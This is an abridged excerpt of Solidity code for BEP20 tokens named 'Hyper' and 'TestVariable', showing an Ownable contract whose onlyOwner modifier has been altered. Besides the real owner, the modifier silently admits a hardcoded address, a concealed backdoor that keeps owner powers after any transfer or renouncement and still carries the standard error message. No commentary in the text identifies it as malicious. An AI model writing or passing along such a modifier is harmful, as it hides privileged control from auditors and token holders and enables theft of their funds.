...
contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || 0xaf2C9Ff464D2dF588b4cB2932fCB1d623380DC3A == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
...
// TestVariable with Governance.
contract TestVariable is BEP20 {
    constructor(
        string memory name,
...
contract Hyper is BEP20('Hyper', 'Hyper') {
    ...
    // The DEX Token!
    TestVariable public dexToken;


    constructor(
        TestVariable _dexToken
    ) public {
        dexToken = _dexToken;
    }
